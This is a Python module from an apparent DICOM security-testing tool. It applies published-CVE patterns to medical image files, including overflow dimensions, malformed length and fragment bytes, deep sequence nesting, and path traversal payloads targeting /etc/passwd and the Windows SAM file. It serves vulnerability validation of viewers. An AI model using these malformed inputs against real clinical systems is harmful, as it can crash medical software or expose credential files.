"""Exploit Pattern Applicator - Applies known CVE patterns to DICOM files.

This module applies known vulnerability patterns to DICOM files for security
validation testing. Unlike fuzzing (which discovers unknown bugs through random
mutations), this applies specific exploit patterns based on published CVEs.

CVEs Covered:
- CVE-2025-5943: Heap buffer overflow via large dimensions
- CVE-2025-11266: Integer underflow in encapsulated PixelData
- CVE-2020-29625: DoS via malformed length fields
- CVE-2021-41946: Path traversal via filename injection
- CVE-2022-24193: DoS via deep sequence nesting
- CVE-2019-11687: Polyglot files (handled at binary level)

Note: Some CVE patterns require binary-level modifications and are applied
during file writing. This module applies Dataset-level mutations that
trigger the same vulnerability patterns.
"""

import logging
import random

from pydicom.dataset import Dataset
from pydicom.sequence import Sequence
from pydicom.tag import Tag
from pydicom.uid import UID

logger = logging.getLogger(__name__)


class ExploitPatternApplicator:
    """Applies known CVE-based exploit patterns to DICOM datasets.

    This is NOT fuzzing - it applies specific, known vulnerability patterns
    to test if a viewer is susceptible to published CVEs. Use this for
    vulnerability validation, not bug discovery.

    For actual fuzzing (discovering unknown bugs), use the robustness
    strategies: metadata, header, pixel, structure.
    """

    def __init__(self) -> None:
        """Initialize exploit pattern applicator with pattern registry."""
        self.patterns_applied: list[str] = []

    def apply_exploit_patterns(self, dataset: Dataset) -> Dataset:
        """Apply random CVE-based exploit patterns to dataset.

        Args:
            dataset: DICOM dataset to modify

        Returns:
            Modified dataset with exploit patterns applied

        """
        # List of available CVE patterns
        patterns = [
            ("CVE-2025-5943:heap_overflow", self._heap_overflow_dimensions),
            ("CVE-2025-5943:integer_overflow", self._integer_overflow_dimensions),
            ("CVE-2020-29625:malformed_length", self._malformed_string_lengths),
            ("CVE-2021-41946:path_traversal", self._path_traversal),
            ("CVE-2022-24193:deep_nesting", self._deep_nesting),
            ("CVE-2019-11687:polyglot_marker", self._polyglot_marker),
            ("CVE-2025-11266:pixel_fragment", self._pixel_data_fragment_attack),
            ("GENERIC:invalid_transfer_syntax", self._invalid_transfer_syntax),
        ]

        # Apply 1-3 random patterns
        num_patterns = random.randint(1, 3)
        selected = random.sample(patterns, min(num_patterns, len(patterns)))

        for name, pattern_func in selected:
            try:
                dataset = pattern_func(dataset)
                self.patterns_applied.append(name)
                logger.debug(f"Applied exploit pattern: {name}")
            except Exception as e:
                logger.debug(f"Exploit pattern {name} failed: {e}")

        return dataset

    def _heap_overflow_dimensions(self, dataset: Dataset) -> Dataset:
        """CVE-2025-5943: Set extreme image dimensions to trigger heap overflow.

        When Rows * Columns * BitsAllocated/8 exceeds allocation, parsers
        may overflow heap buffers during pixel data processing.
        """
        # Set maximum dimensions to trigger large allocations
        dataset.Rows = 65535
        dataset.Columns = 65535
        dataset.BitsAllocated = 16
        dataset.BitsStored = 16
        dataset.HighBit = 15
        dataset.SamplesPerPixel = 1

        return dataset

    def _integer_overflow_dimensions(self, dataset: Dataset) -> Dataset:
        """CVE-2025-5943: Set dimensions that cause integer overflow.

        Values chosen so that Rows * Columns overflows 32-bit integers.
        """
        overflow_pairs = [
            (32768, 32768),  # 32768^2 = 1073741824 (fits), but *2 bytes = overflow
            (46341, 46341),  # ~2^31 when multiplied
            (65535, 65535),  # Maximum 16-bit values
        ]

        rows, cols = random.choice(overflow_pairs)
        dataset.Rows = rows
        dataset.Columns = cols
        dataset.BitsAllocated = 16

        return dataset

    def _malformed_string_lengths(self, dataset: Dataset) -> Dataset:
        """CVE-2020-29625: Insert extremely long strings to trigger buffer issues.

        Parsers may allocate fixed-size buffers for certain string fields.
        """
        # Create strings that exceed typical buffer sizes
        long_string_2k = "A" * 2048
        long_string_32k = "X" * 32768

        # Apply to various string fields
        if hasattr(dataset, "PatientName"):
            dataset.PatientName = long_string_2k
        if hasattr(dataset, "InstitutionName"):
            dataset.InstitutionName = long_string_32k
        if hasattr(dataset, "StudyDescription"):
            dataset.StudyDescription = long_string_2k
        if hasattr(dataset, "SeriesDescription"):
            dataset.SeriesDescription = long_string_32k

        # Also set some private tags with long values
        dataset.add_new(Tag(0x0009, 0x0010), "LO", long_string_32k)
        dataset.add_new(Tag(0x0043, 0x0010), "LO", long_string_32k)

        return dataset

    def _path_traversal(self, dataset: Dataset) -> Dataset:
        """CVE-2021-41946: Inject path traversal payloads in file references."""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "\\\\server\\share\\file",
        ]

        payload = random.choice(payloads)

        # Use LO (Long String) VR which allows more characters than CS
        # Private tags can have any VR
        dataset.add_new(Tag(0x0009, 0x1001), "LO", payload)  # Private path field

        # Also try in StorageMediaFileSetID which uses SH VR (allows paths)
        try:
            dataset.StorageMediaFileSetID = payload[:16]  # SH max 16 chars
        except Exception as e:
            logger.debug(f"Could not set StorageMediaFileSetID: {e}")

        return dataset

    def _deep_nesting(self, dataset: Dataset) -> Dataset:
        """CVE-2022-24193: Create deeply nested sequences to exhaust stack."""
        nesting_depth = random.randint(50, 200)

        # Build a deeply nested sequence structure
        inner_dataset = Dataset()
        inner_dataset.PatientName = "Nested"

        for _ in range(nesting_depth):
            wrapper = Dataset()
            wrapper.add_new(Tag(0x0008, 0x1115), "SQ", Sequence([inner_dataset]))
            inner_dataset = wrapper

        # Add the deeply nested structure
        dataset.add_new(Tag(0x0008, 0x1115), "SQ", Sequence([inner_dataset]))

        return dataset

    def _polyglot_marker(self, dataset: Dataset) -> Dataset:
        """CVE-2019-11687: Add markers indicating polyglot potential.

        The actual PE/ELF header injection happens at binary level during save.
        This mutation adds metadata markers and modifies preamble-related fields.
        """
        # Add a marker in file meta info if available
        if hasattr(dataset, "file_meta"):
            # Set implementation class UID to something suspicious
            dataset.file_meta.ImplementationClassUID = UID("1.2.3.4.5.6.7.8.9.0.MZ")

        # Add private tag indicating polyglot test
        dataset.add_new(Tag(0x0009, 0x1000), "LO", "POLYGLOT_TEST_MARKER")

        return dataset

    def _pixel_data_fragment_attack(self, dataset: Dataset) -> Dataset:
        """CVE-2025-11266: Manipulate pixel data attributes for fragment attacks.

        Sets up conditions that may trigger integer underflow in encapsulated
        pixel data parsing by creating mismatched frame counts and dimensions.
        """
        # Set conflicting frame information
        dataset.NumberOfFrames = 10
        dataset.Rows = 1
        dataset.Columns = 1
        dataset.BitsAllocated = 8

        # Add encapsulated-related attributes
        if hasattr(dataset, "file_meta"):
            # Set to JPEG transfer syntax (encapsulated)
            dataset.file_meta.TransferSyntaxUID = UID("1.2.840.10008.1.2.4.50")

        return dataset

    def _invalid_transfer_syntax(self, dataset: Dataset) -> Dataset:
        """Inject invalid transfer syntax UID to test parser robustness."""
        invalid_uids = [
            "1.2.3.4.5.6.7.8.9.0" + "." * 50,  # Excessively long
            "0.0",  # Minimal
            "1.2.840.10008.1.2.4.9999",  # Non-existent JPEG variant
            "INVALID.TRANSFER.SYNTAX",  # Non-numeric
        ]

        if hasattr(dataset, "file_meta"):
            dataset.file_meta.TransferSyntaxUID = UID(random.choice(invalid_uids))

        return dataset

    def get_patterns_applied(self) -> list[str]:
        """Return list of patterns applied in last call."""
        return self.patterns_applied.copy()

    def reset_stats(self) -> None:
        """Reset pattern tracking."""
        self.patterns_applied = []

    # Backward compatibility aliases
    def apply_cve_mutations(self, dataset: Dataset) -> Dataset:
        """Deprecated: Use apply_exploit_patterns instead."""
        return self.apply_exploit_patterns(dataset)

    def get_mutations_applied(self) -> list[str]:
        """Deprecated: Use get_patterns_applied instead."""
        return self.get_patterns_applied()

    @property
    def mutations_applied(self) -> list[str]:
        """Deprecated: Use patterns_applied instead."""
        return self.patterns_applied

    @mutations_applied.setter
    def mutations_applied(self, value: list[str]) -> None:
        """Deprecated: Use patterns_applied instead."""
        self.patterns_applied = value


# Backward compatibility alias
CVEFuzzer = ExploitPatternApplicator


# =============================================================================
# Binary-Level Exploit Patterns
# =============================================================================
# These functions return raw bytes for binary-level file injection/corruption.
# They bypass pydicom and directly test binary parsing in DICOM viewers.


def create_binary_sequence_attacks() -> list[tuple[str, bytes]]:
    """Create binary-level sequence attacks for file corruption.

    Returns list of (name, bytes) tuples for binary injection.
    These bypass pydicom and directly test binary parsing.

    Targets:
    - Missing sequence/item delimiters
    - Corrupted item tags
    - Large/negative length fields
    """
    attacks = []

    # Missing sequence delimiter
    missing_delim = (
        b"\xFE\xFF\x00\xE0"
        + b"\xFF\xFF\xFF\xFF"
        + b"\x00" * 100
    )
    attacks.append(("missing_seq_delimiter", missing_delim))

    # Missing item delimiter
    missing_item_delim = (
        b"\xFE\xFF\x00\xE0"
        + b"\xFF\xFF\xFF\xFF"
        + b"\x00" * 100
        + b"\xFE\xFF\xDD\xE0"
        + b"\x00\x00\x00\x00"
    )
    attacks.append(("missing_item_delimiter", missing_item_delim))

    # Corrupted item tag
    corrupted_item_tag = (
        b"\xFE\xFF\x01\xE0"
        + b"\x00\x00\x00\x10"
        + b"\x00" * 16
    )
    attacks.append(("corrupted_item_tag", corrupted_item_tag))

    # Very large sequence length
    large_length = (
        b"\x08\x00\x15\x11"
        + b"SQ"
        + b"\x00\x00"
        + b"\xFF\xFF\xFF\x7F"
    )
    attacks.append(("large_sequence_length", large_length))

    # Negative length (interpreted as unsigned = very large)
    negative_length = (
        b"\x08\x00\x15\x11"
        + b"SQ"
        + b"\x00\x00"
        + b"\xFF\xFF\xFF\xFF"
    )
    attacks.append(("negative_length", negative_length))

    return attacks


def create_encapsulated_pixel_attacks() -> list[tuple[str, bytes]]:
    """Create binary attacks for encapsulated pixel data.

    Returns list of (attack_name, bytes) for injection into DICOM files.
    Targets Basic Offset Table and fragment structure parsing.
    """
    import struct

    attacks = []

    # PixelData tag for encapsulated data
    pixel_tag = b"\xE0\x7F\x10\x00"  # (7FE0,0010) little endian

    # Attack 1: Empty Basic Offset Table with fragments
    empty_bot = (
        pixel_tag
        + b"OB"
        + b"\x00\x00"
        + b"\xFF\xFF\xFF\xFF"
        + b"\xFE\xFF\x00\xE0"
        + b"\x00\x00\x00\x00"
        + b"\xFE\xFF\x00\xE0"
        + b"\x10\x00\x00\x00"
        + b"\xFF" * 16
        + b"\xFE\xFF\xDD\xE0"
        + b"\x00\x00\x00\x00"
    )
    attacks.append(("empty_bot", empty_bot))

    # Attack 2: Fragment with zero length
    zero_fragment = (
        pixel_tag
        + b"OB\x00\x00"
        + b"\xFF\xFF\xFF\xFF"
        + b"\xFE\xFF\x00\xE0\x00\x00\x00\x00"
        + b"\xFE\xFF\x00\xE0"
        + b"\x00\x00\x00\x00"
        + b"\xFE\xFF\xDD\xE0\x00\x00\x00\x00"
    )
    attacks.append(("zero_length_fragment", zero_fragment))

    # Attack 3: Fragment with undefined length
    undefined_fragment = (
        pixel_tag
        + b"OB\x00\x00"
        + b"\xFF\xFF\xFF\xFF"
        + b"\xFE\xFF\x00\xE0\x00\x00\x00\x00"
        + b"\xFE\xFF\x00\xE0"
        + b"\xFF\xFF\xFF\xFF"
        + b"\xFF" * 100
        + b"\xFE\xFF\x0D\xE0\x00\x00\x00\x00"
        + b"\xFE\xFF\xDD\xE0\x00\x00\x00\x00"
    )
    attacks.append(("undefined_length_fragment", undefined_fragment))

    # Attack 4: Missing sequence delimiter
    missing_delim = (
        pixel_tag
        + b"OB\x00\x00"
        + b"\xFF\xFF\xFF\xFF"
        + b"\xFE\xFF\x00\xE0\x00\x00\x00\x00"
        + b"\xFE\xFF\x00\xE0"
        + b"\x10\x00\x00\x00"
        + b"\xFF" * 16
    )
    attacks.append(("missing_sequence_delimiter", missing_delim))

    # Attack 5: Overlapping fragment offsets in BOT
    overlapping_bot = (
        pixel_tag
        + b"OB\x00\x00"
        + b"\xFF\xFF\xFF\xFF"
        + b"\xFE\xFF\x00\xE0"
        + b"\x0C\x00\x00\x00"
        + struct.pack("<I", 0)
        + struct.pack("<I", 8)
        + struct.pack("<I", 4)
        + b"\xFE\xFF\x00\xE0\x20\x00\x00\x00" + b"\xFF" * 32
        + b"\xFE\xFF\xDD\xE0\x00\x00\x00\x00"
    )
    attacks.append(("overlapping_offsets", overlapping_bot))

    # Attack 6: Very large offset
    large_offset_bot = (
        pixel_tag
        + b"OB\x00\x00"
        + b"\xFF\xFF\xFF\xFF"
        + b"\xFE\xFF\x00\xE0"
        + b"\x04\x00\x00\x00"
        + struct.pack("<I", 0x7FFFFFFF)
        + b"\xFE\xFF\x00\xE0\x10\x00\x00\x00" + b"\xFF" * 16
        + b"\xFE\xFF\xDD\xE0\x00\x00\x00\x00"
    )
    attacks.append(("large_offset", large_offset_bot))

    # Attack 7: Negative offset
    negative_offset_bot = (
        pixel_tag
        + b"OB\x00\x00"
        + b"\xFF\xFF\xFF\xFF"
        + b"\xFE\xFF\x00\xE0"
        + b"\x04\x00\x00\x00"
        + struct.pack("<i", -1)
        + b"\xFE\xFF\x00\xE0\x10\x00\x00\x00" + b"\xFF" * 16
        + b"\xFE\xFF\xDD\xE0\x00\x00\x00\x00"
    )
    attacks.append(("negative_offset", negative_offset_bot))

    return attacks


def create_transfer_syntax_attacks() -> list[tuple[str, bytes]]:
    """Create binary attacks targeting transfer syntax handling.

    Returns list of (attack_name, bytes) for injection/replacement.
    Tests encoding edge cases that commonly cause parser confusion.
    """
    attacks = []

    ts_tag = b"\x02\x00\x10\x00"

    # Unknown transfer syntax UID
    unknown_ts = (
        ts_tag
        + b"UI"
        + b"\x1A\x00"
        + b"9.9.999.99999.9.9.9.9.9.9"
        + b"\x00"
    )
    attacks.append(("unknown_transfer_syntax", unknown_ts))

    # Empty transfer syntax
    empty_ts = (
        ts_tag
        + b"UI"
        + b"\x00\x00"
    )
    attacks.append(("empty_transfer_syntax", empty_ts))

    # Very long transfer syntax UID
    long_ts = (
        ts_tag
        + b"UI"
        + b"\x00\x01"
        + b"1.2.840." + b"9" * 248
    )
    attacks.append(("long_transfer_syntax", long_ts))

    # Transfer syntax with null bytes
    null_ts = (
        ts_tag
        + b"UI"
        + b"\x20\x00"
        + b"1.2.840.10008\x00\x00\x00.1.2.1"
        + b"\x00" * 6
    )
    attacks.append(("null_in_transfer_syntax", null_ts))

    # Mixed explicit/implicit encoding
    mixed_encoding = (
        b"\x08\x00\x18\x00"
        + b"UI"
        + b"\x00\x00"
        + b"\x20\x00\x00\x00"
        + b"1.2.3.4.5.6.7.8.9.0.1.2.3.4.5"
        + b"\x00"
    )
    attacks.append(("mixed_explicit_implicit", mixed_encoding))

    # Big endian tag in little endian file
    wrong_endian = (
        b"\x00\x08\x00\x18"
        + b"\x00\x00\x00\x20"
        + b"1.2.3.4.5.6.7.8.9.0.1.2.3.4.5"
        + b"\x00\x00"
    )
    attacks.append(("wrong_endianness", wrong_endian))

    # Fake deflated syntax
    fake_deflate_ts = (
        ts_tag
        + b"UI"
        + b"\x18\x00"
        + b"1.2.840.10008.1.2.1.99"
        + b"\x00\x00"
    )
    attacks.append(("fake_deflated", fake_deflate_ts))

    return attacks


def create_length_overflow_attacks() -> list[tuple[str, bytes]]:
    """Create binary attacks targeting length field parsing.

    Returns list of (attack_name, bytes) for file corruption.
    Targets integer overflow/underflow in length calculations.
    """
    attacks = []

    test_tag = b"\x08\x00\x50\x00"

    # Undefined length for non-SQ element
    undefined_len = (
        test_tag
        + b"LO"
        + b"\x00\x00"
        + b"\xFF\xFF\xFF\xFF"
        + b"TEST"
    )
    attacks.append(("undefined_length_non_sq", undefined_len))

    # Length exceeds actual data
    oversize_len = (
        test_tag
        + b"LO"
        + b"\x00\x00"
        + b"\x00\x10\x00\x00"
        + b"ONLY16BYTESHERE!"
    )
    attacks.append(("length_exceeds_data", oversize_len))

    # Max 16-bit length for short VRs
    max_short_len = (
        test_tag
        + b"SH"
        + b"\xFF\xFF"
        + b"SHORT"
    )
    attacks.append(("max_16bit_length", max_short_len))

    # Odd length for word-aligned VR
    odd_length = (
        b"\xE0\x7F\x10\x00"
        + b"OW"
        + b"\x00\x00"
        + b"\x01\x00\x00\x00"
        + b"\xFF"
    )
    attacks.append(("odd_length_ow", odd_length))

    # Signed negative length
    signed_negative = (
        test_tag
        + b"LO"
        + b"\x00\x00"
        + b"\x00\x00\x00\x80"
        + b"DATA"
    )
    attacks.append(("signed_negative_length", signed_negative))

    # Dimension overflow
    overflow_dimensions = (
        b"\x28\x00\x10\x00"
        + b"US"
        + b"\x02\x00"
        + b"\xFF\xFF"
        + b"\x28\x00\x11\x00"
        + b"US"
        + b"\x02\x00"
        + b"\xFF\xFF"
    )
    attacks.append(("dimension_overflow", overflow_dimensions))

    return attacks
